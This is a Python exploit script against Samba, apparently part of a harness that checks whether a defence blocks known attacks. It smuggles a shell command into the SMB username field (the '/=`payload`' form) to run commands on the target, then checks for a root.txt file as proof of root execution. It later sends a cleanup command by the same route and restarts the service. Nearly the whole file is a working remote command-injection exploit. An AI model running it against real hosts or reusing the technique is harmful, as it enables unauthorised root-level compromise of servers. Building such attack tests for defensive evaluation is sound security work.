#!/usr/bin/python3

import sys
import time
import os
from smb.SMBConnection import SMBConnection

# installed packages
from pwn import *
import argparse

# declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# custom package
import pre_settings
import pre_ping_check
import pre_services_check
import pre_attacks
import pre_services_restart
import pre_output_check

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

def exploit(rhost, rport, attacks):
    try:
        status_ping = pre_ping_check.check(rhost)
        status_service_pre = pre_services_check.check(rhost, rport)

        if not status_service_pre:
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            status_pre_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(3)

        status_service_pre = pre_services_check.check(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        conn = None

        if status_service_pre:
            username = f"/=`{attacks['payload']}`" 
            conn = SMBConnection(username, "", "", "", use_ntlm_v2=False)

            try:
                conn.connect(rhost, int(rport), timeout=3)
                output = pre_output_check.check(rhost)
                
                time.sleep(15)

                # took 8s to create root.txt
                output = pre_output_check.check(rhost)

                status_service_post = pre_services_check.check(rhost, rport)
                status_attack = False

                if 'root' in output:
                    attacks['status (attack)'] = 'UNBLOCKED'
                    attacks['remark'] = pre_attacks.success_exploit
                    status_attack = True
                else:
                    attacks['remark'] = pre_attacks.fail_exploit

                print(pre_settings.print_status_attack_inaccessible(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
                return attacks
            
            except SMBConnection.SMBException as e:
                log.error(str(e))
                # attacks['remark'] = pre_attacks.fail_exploit
                # return attacks

            except (subprocess.SubprocessError, subprocess.TimeoutExpired, pwnlib.exception.PwnlibException, Exception) as e:
                log.error(str(e))
                sys.exit(1)

            finally:
                # Ensure cleanup happens whether or not an error occurred
                try:
                    if 'conn' in locals() and conn:
                        username = f"/=`{attacks['cleanup']}`" 
                        conn = SMBConnection(username, "", "", "", use_ntlm_v2=False)
                        conn.connect(rhost, int(rport), timeout=3)
                        conn.close()
                        
                        # cleanup and restart the service
                        time.sleep(2)
                        log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], pre_services_check.check(rhost, rport), 'cleanup'))
                        status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])

                except Exception as e:
                    log.error(str(e))

        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack_inaccessible(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))

            return attacks

    except KeyboardInterrupt:
        sys.exit(0)

def main():
    try:
        attacks = pre_attacks.attacks.get('samba')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5 --rport (445/non-cloud | 8001/cloud)")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        parser.add_argument('--rport', help='Target Port', type=int, default=445)
        args = parser.parse_args()

        rhost = args.rhost
        rport = args.rport

        # cloud on port 8001 and non cloud on port 445
        if rport in attacks['port']:
            exploit(rhost, rport, attacks)
        else:
            log.error("Invalid rport specified or service not found!")

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()